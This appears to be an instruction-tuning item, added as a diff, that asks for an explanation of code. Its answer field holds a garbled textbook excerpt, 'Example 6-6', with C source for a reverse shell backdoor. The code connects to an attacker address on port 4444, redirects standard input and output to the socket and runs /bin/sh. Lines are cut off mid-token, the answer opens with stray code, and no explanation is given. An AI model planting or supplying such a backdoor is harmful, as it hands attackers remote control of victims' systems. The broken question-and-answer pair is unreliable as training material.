@@ -1,0 +1,29 @@
+TECHNIQUE / QUESTION:
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+return 0;
+}
+Example 6-6 shows the modified source code that includes a reverse shell
+backdoor.
+Example 6-6 Modified Source Code with Backdoor
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+void reverse_shell() {
+int sockfd;
+struct sockaddr_in serv_addr;
+sockfd = socket(AF_INET, SOCK_STREAM, 0);
+serv_addr.sin_family = AF_INET;
+serv_addr.sin_addr.s_addr = inet_addr("192.168.1.1
+serv_addr.sin_port = htons(4444); // Attacker's po
+connect(sockfd, (struct sockaddr *)&serv_addr, siz
+dup2(sockfd, 0); // Redirect standard input
+dup2(sockfd, 1); // Redirect standard output
+dup2(sockfd, 2); // Redirect standard error
+execl("/bin/sh", "sh", NULL); // Execute shell
